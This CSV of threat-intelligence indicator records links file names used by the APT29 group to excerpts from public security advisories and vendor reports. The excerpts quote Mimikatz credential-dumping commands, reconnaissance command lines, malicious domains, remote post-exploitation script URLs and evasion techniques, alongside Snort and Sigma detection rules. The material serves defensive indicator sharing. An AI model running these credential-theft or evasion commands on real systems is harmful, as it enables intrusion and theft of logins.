1.0.0,actor--apt29,artifact--sha256:914aec92794c936ca04d7ee658db7112008da1b620e57d575ca3480a2dfb65fe,observation--sha256:c17ac1eeca5955c22d7184e02f36edf2a32d07da40448800158cc89f9e3f8b99,file-name,runner.dll,runner.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 2/36 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:b0c3e51712f67401904932485c0bd9d6b6973aafecb07db86c30076d4cc6331a,observation--sha256:2fe5cecaf417ae8e39f694c0f541e5f3479dee566eb83e7119995179aef52e9a,file-name,s.zip,s.zip,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:e742e9129506fd5f16bca9d812684d8651cd18e0adc64fea61ee74baac92d926,observation--sha256:893605b33e3a0233bd8940171966819fff5ee3bbe36fc9f41884e74bac860a5a,file-name,saleinKyiv-2023.docx,saleinKyiv-2023.docx,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure4 Screenshot of HTMLcontent associatedwithBlueBravoactivityfromlate2022 Source: URLScan) Thefiletitled“BMW5for saleinKyiv-2023.docx” displaysapromotionfor thesaleof anautomobileinKyiv, Ukraine. AsshowninFigure5, thelurecontainsaURL-shortener address(t[.]ly) that wouldredirect tohxxps://resetlocations[.]com/bmw[.]htmat thetimeof analysis. ThesecondsubmissionreferencedaboveusesthesameBMW-themedluredocument withadifferent URLredirector(tinyurl[.]com) that alsoredir",
1.0.0,actor--apt29,artifact--sha256:8fb32a385ec8b4926f019cf3eae9831ffb5a977c53654b136f10979b86f3ae16,observation--sha256:bfdb74a93d18d830f88ec3bc24ffd9115c889081255f88cbc4ed20d0240ffb28,file-name,samples.php,samples.php,candidate,,unknown,unknown,not-stated,,source--apt29--d219ac10702e638c,APT29/Advisory Further TTPs associated with SVR cyber actors.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - signin.php Send""; content:""/signin.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/signin\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - api.php Send""; content:""/api.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/api\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - samples.php Send""; content:""/samples.php?_=""; pcre:""",
1.0.0,actor--apt29,artifact--sha256:3646510cfb6c593cb0c554b9766e3203d49be065d48a6a9125c06800b4a080c3,observation--sha256:ff1604fa89b3921832209fde258767c9a37ec4088b2003cc05336c1130a69c2d,file-name,schedule.php,schedule.php,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly. Technical Analysis Infrastructure On October 25, 2022, we identified the domain totalmassasje[.]no delivering the malicious ZIP file“schedule.zip” via the webpage “schedule.php”. This webpage contains lure text masquerading as an“Ambassad",
1.0.0,actor--apt29,artifact--sha256:3646510cfb6c593cb0c554b9766e3203d49be065d48a6a9125c06800b4a080c3,observation--sha256:fdb83ff2c83024e1ba05c79cf56288a2ecef2a309b8a1c43a6ea8b3d7a183a12,file-name,schedule.php,schedule.php,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 5/11 Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979b128cbeddf4e70",
1.0.0,actor--apt29,artifact--sha256:3646510cfb6c593cb0c554b9766e3203d49be065d48a6a9125c06800b4a080c3,observation--sha256:ae3a56ac784875a5f96fd6c2209507a46dfc470b7bb000b6c43db2d7d6302f66,file-name,schedule.php,schedule.php,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 21/24 Network IoCs Indicator Value 2nd stage - CobaltStrike beacon (decrypted) File Name hXaIk1725.pdf File Size 261,635B MD5 800db035f9b6f1e86a7f446a8a8e3947 SHA1 aaf973a56b17a0a82cf1b3a49ff68da1c50283d4 SHA256 032855b043108967a6c2de154624c16b70a0b7d0d0a0e93064b387f59537cc1e Indicator Value 2nd stage – BruteRatel stageless badger (decrypted) File Name hXaIk1314.pdf File Size 347,837 MD5 0e594576bb36b025e80eab7c35dc885e SHA1 a8a82a7da2979",
1.0.0,actor--apt29,artifact--sha256:1bc8f97dba8ac5505efcd679f292ea4722a15655782cab212d75d35ab77772d4,observation--sha256:6eb686d99f48bf3e3614cc0f8b2a2e504af2dfbafa55250ade4b159b08c74b54,file-name,schedule.zip,schedule.zip,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly. Technical Analysis Infrastructure On October 25, 2022, we identified the domain totalmassasje[.]no delivering the malicious ZIP file“schedule.zip” via the webpage “schedule.php”. This webpage contains lure text masquerading as an“Ambassad",
1.0.0,actor--apt29,artifact--sha256:1bc8f97dba8ac5505efcd679f292ea4722a15655782cab212d75d35ab77772d4,observation--sha256:4a983e4c4e752118c9b0e6eac608fcde8010d10ac9cb3eeee145c0b4b25324bc,file-name,schedule.zip,schedule.zip,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Figure 2  Screenshot of HTML content (with the arrayof decimal values of obfuscated payload abbreviated with the use of“......”)  Source: URLScan) Analysis of the webpage’s HTML and JavaScript identified close overlap with EnvyScout, a dropper firstnoted byMicrosoft. Additionally, lines 14 35 arestructurally identical to Unit42’sreportingon thesametechnique, with only lines 15 and 21 changing using a different deprecated integer and filename. Lines 13 16 show a for-loop rou",
1.0.0,actor--apt29,artifact--sha256:1bc8f97dba8ac5505efcd679f292ea4722a15655782cab212d75d35ab77772d4,observation--sha256:a237fb0f3c36386961a2682fd16bd6c63ea9cf8a34125a914fb6d6bc96228f93,file-name,schedule.zip,schedule.zip,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Malware The malicious ZIP file “schedule.zip”  SHA256cf160175c661efd4b1e1eecadf5f00f7203ef4c7445e36e3373d50b26086c552  was auto-downloadedfrom totalmassasje[.]no and contains three files, as shown inTable 1. Filename File Type SHA256 november_schedulexe.pdf EXE 844e902977b478eace8568f49dd9e5c91db8e534f3c5410ee663d0be02bdf7e3 vcruntime140.dll DLL a0c3e6cd167b93f4646a7a3f2d46ed8bd4888d861b533662a66ca9711d49db1f 7za.dll DLL 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62",
1.0.0,actor--apt29,artifact--sha256:cb088e7bff97bc236dca4e70da43e72815ebd0ffda5a81a4e0f438cb5682897e,observation--sha256:de6bcd1b2bd9d76388d1785654690d207967a5c7103f805c105e21884b7ab802,file-name,schtasks.exe,schtasks.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 19 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR condition: selection title: Scheduled tasks names used by SVR for GraphicalProton backdoor description: Hunts for known SVR-specific scheduled task names author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'schtasks.exe' CommandLine|contains: - 'IISUpdateService' - 'WindowsDefenderService' - 'WindowsDefenderService2' - 'DefenderServic,
1.0.0,actor--apt29,artifact--sha256:cb088e7bff97bc236dca4e70da43e72815ebd0ffda5a81a4e0f438cb5682897e,observation--sha256:eb0fbdcaa66a27074345e24f90baf68daf1418b18dde5b369e1c8a017bca966c,file-name,schtasks.exe,schtasks.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:e48ce6eb245a9fe840e49cff42d3bdf47906f901fe967a7454ec5d582827909f,observation--sha256:f0d957e7ce59da56a2174970162e50554ad7f351c5c247b1772520747168d0f8,file-name,screeshots.pdb,screeshots.pdb,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 28 CozyDuke is not simply a malware toolset; rather, it is a modular malware platform formed around a core backdoor component. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include: • Command execution module for executing arbitrary Windows Command Prompt commands • Password stealer module • NT LAN Manager (",
1.0.0,actor--apt29,artifact--sha256:4133934f566a53070edcab6b1e1b972c0435c350d19b56c77c2632b3552ec733,observation--sha256:ad51cc60093c3cc0d86c87d365a261190d6e7fa3e029bbc2d7e4a175263f8e57,file-name,secforwarder.dll,secforwarder.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:4133934f566a53070edcab6b1e1b972c0435c350d19b56c77c2632b3552ec733,observation--sha256:53dfc6555543a24f7da45d0ff1c3632285ab38aca5c8ff9dc514ce3a365d07d6,file-name,secforwarder.dll,secforwarder.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 5 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  SVR cyber actors also exfiltrated secforwarder.dll Tactics Used to Avoid Detection To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software. [T1562.001] This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remo",
1.0.0,actor--apt29,artifact--sha256:23f5c8e5e9153e3a41adf1682abe82f87df826d027d2ed442631120860f0a7e5,observation--sha256:5978c5e03e7c774a01a65068beea1818f2682b8ee16a51e08ff58a95621c06f4,file-name,signin.php,signin.php,candidate,,unknown,unknown,not-stated,,source--apt29--d219ac10702e638c,APT29/Advisory Further TTPs associated with SVR cyber actors.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - signin.php Send""; content:""/signin.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/signin\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - api.php Send""; content:""/api.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/api\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - samples.php Send""; content:""/samples.php?_=""; pcre:""",
1.0.0,actor--apt29,artifact--sha256:e0e21ba7a9ee8b080dc29ac140bb8a7082604cacaf4d9e9e9a38ea2dc7c97f52,observation--sha256:726459c1aa98481a8c13475853b05bcc213bd16e436acefa8c4c974acea1db86,file-name,sk-jspark_init.php,sk-jspark_init.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 16}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 13. Same script is called from both securesearchnow[.]com and 208.91.198.23 Figure 13 illustrates the similarities between securesearchnow[.]com and 208.91.198.23 IP address. Both of the web servers redirect the visitors to a PHP script hosted at freeresultsguide[.]com. Ideally, we would like to analyze the source code of sk-jspark_init.php. However, the PTI Team could not find the code of the script during the writing of this report. We believe it might giv",
1.0.0,actor--apt29,artifact--sha256:e0e21ba7a9ee8b080dc29ac140bb8a7082604cacaf4d9e9e9a38ea2dc7c97f52,observation--sha256:083fb7e2c9eae0e80d59f36fda35955812ef9e157567539a0490c3163d0645d2,file-name,sk-jspark_init.php,sk-jspark_init.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:5aae70257c4fbd4cde8d7cb9df5a8b168d53a586f9d049ce18b3e619fceff0d6,observation--sha256:6b41538a3048c6f764a1a5ae195d6e62f3f682c5b5454acd9bbf0e2a637d6cb2,file-name,sql.zip,sql.zip,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:4fedafcdc665ee152a35684c3477968661f63acc86507ff17e09cd76b3b8ac71,observation--sha256:8d024bf986c0f8483759be673f3fe7887d52ac2122952c184c60bf2142f93900,file-name,sqllang.dll,sqllang.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:6ea3153520e7891c6203de5d3169b3f130d72631e27efeb900fdb36902af0523,observation--sha256:4f9256a4781d3a46a9a74f3779b482739ef49459604afedbeb934557e22383b6,file-name,sqllos.dll,sqllos.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:70913db6a38b175d67b2e30af664223bf6b3b30e148eac9a4a4785a10e93cb00,observation--sha256:99bd5faec3951a7eb16b3acbf8c23eaa3ba8648a8bbb5549fcb138540b594184,file-name,sqlmin.dll,sqlmin.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:160a0baa34daeaa6e2a1b56f236a1787637fbf11c131fea2a8dc3e1fcdbef4e2,observation--sha256:bffd728ab3bc99c9e8e7670042965c1cfd6acf762631bd56844e9ce59992ff8c,file-name,sqltses.dll,sqltses.dll,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:fe191a81066bf10e3674ce232ee9f2596048954b944702c8d49bb9008448e8ec,observation--sha256:42fc79dc55e602aae3d357c82c7ee4ad0d55dee911f337e86c5974e5c8240eb2,file-name,systeminfo.pdb,systeminfo.pdb,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 28 CozyDuke is not simply a malware toolset; rather, it is a modular malware platform formed around a core backdoor component. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include: • Command execution module for executing arbitrary Windows Command Prompt commands • Password stealer module • NT LAN Manager (",
1.0.0,actor--apt29,artifact--sha256:5d2ce8b34fa3f098aae7c77059dbd8bae57e5779ee6c80a5b70b1a7510d63773,observation--sha256:43d9166ceef434f832ca9dab7f9aa6515de497d97d3cbfbb162f08673dce6ef5,file-name,themysteryofthepdf0-dayassemblermicrobackdoor.pdf,themysteryofthepdf0-dayassemblermicrobackdoor.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 27 The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke “stage 1”, “stage 2”, and “stage 3” components as per Kaspersky’s original MiniDuke whitepaper. Additionally, a specific loader is often associated with the MiniDuke toolset and is referred to as the “MiniDuke loader”. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conju",
1.0.0,actor--apt29,artifact--sha256:eaf2f2b240373c155ff636258ce38b8a8dc0df85227097734506c381f098a163,observation--sha256:0488ddde16bfc815948102d8aa16c6f787955f8ec55223995813425cf74949c8,file-name,thevcruntime140.dll,thevcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS be version 14.30.30704.0; however, a comparison with the legitimate version of the DLL  SHA256 081a273ad809f650ebaeb91c11fcc7a1ad91232a7228f8e98b52191fe44cb06d) reveals that the file hasbeen modified. A side-by-side comparison of each DLL’s Properties window is shown inFigure 6withthe legitimate version on the left and the modified version on the right. Notably, the modified versionhas also removed Microsoft’s digital signature. Figure 6 Comparison of the legitimate (left) ",
1.0.0,actor--apt29,artifact--sha256:d471186ea7b2d381cb498a480f557b7d20d197e467b645ca6cfcabc641bb423b,observation--sha256:a50dfa76b6bd87722eef28191e31930192c90cac6d59deee61dbb53604a62775,file-name,underscore.min.js,underscore.min.js,candidate,,unknown,unknown,not-stated,,source--apt29--d219ac10702e638c,APT29/Advisory Further TTPs associated with SVR cyber actors.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - signin.php Send""; content:""/signin.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/signin\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - api.php Send""; content:""/api.php?_=""; pcre:""/\APOST (?:\/(?:api|rest|drupal|wordpress))?\/api\.php\?_=[0-9]{1,9} HTTP/"";) alert tcp any any -> any any (msg: ""Sliver HTTP implant beacon - samples.php Send""; content:""/samples.php?_=""; pcre:""",
1.0.0,actor--apt29,artifact--sha256:3ee531e6721c63e50655ed3213ec456c33012e81203a27eaefc4210011a1499e,observation--sha256:09d3a9a5999a4f6bc2abb221f9e3a8454e5f948acb26352755533c4dad803320,file-name,vcruntime140.dll,vcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Malware The malicious ZIP file “schedule.zip”  SHA256cf160175c661efd4b1e1eecadf5f00f7203ef4c7445e36e3373d50b26086c552  was auto-downloadedfrom totalmassasje[.]no and contains three files, as shown inTable 1. Filename File Type SHA256 november_schedulexe.pdf EXE 844e902977b478eace8568f49dd9e5c91db8e534f3c5410ee663d0be02bdf7e3 vcruntime140.dll DLL a0c3e6cd167b93f4646a7a3f2d46ed8bd4888d861b533662a66ca9711d49db1f 7za.dll DLL 381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62",
1.0.0,actor--apt29,artifact--sha256:3ee531e6721c63e50655ed3213ec456c33012e81203a27eaefc4210011a1499e,observation--sha256:f611e63b30eb7fb03541d79beb14fd04ef03f504615073cde67da4763b36cec6,file-name,vcruntime140.dll,vcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Figure 4 File details of november_schedulexe.pdf Source: Recorded Future) The filename november_schedulexe.pdf tries to trick the user into thinking it ends with “.pdf” (the PDFfile extension), when in fact the filename ends with “.exe”. It does this by implementing the right-to-leftoverride  RTLO  technique, which supports languages written right to left. A hexdump of the filename,as shown inFigure 5,helps to represent this by displayingthe extra bytes that enable RTLO. 00",
1.0.0,actor--apt29,artifact--sha256:3ee531e6721c63e50655ed3213ec456c33012e81203a27eaefc4210011a1499e,observation--sha256:e5101fdf5005d0cd7c91aa8e0898e96347fd2eeeb1a11d6cb904b006f24d489e,file-name,vcruntime140.dll,vcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS be version 14.30.30704.0; however, a comparison with the legitimate version of the DLL  SHA256 081a273ad809f650ebaeb91c11fcc7a1ad91232a7228f8e98b52191fe44cb06d) reveals that the file hasbeen modified. A side-by-side comparison of each DLL’s Properties window is shown inFigure 6withthe legitimate version on the left and the modified version on the right. Notably, the modified versionhas also removed Microsoft’s digital signature. Figure 6 Comparison of the legitimate (left) ",
1.0.0,actor--apt29,artifact--sha256:3ee531e6721c63e50655ed3213ec456c33012e81203a27eaefc4210011a1499e,observation--sha256:34c952d621d9b7d40ef5ec0b8d1b574b2dcbdede819f70af70bc5c7fc3983da8,file-name,vcruntime140.dll,vcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
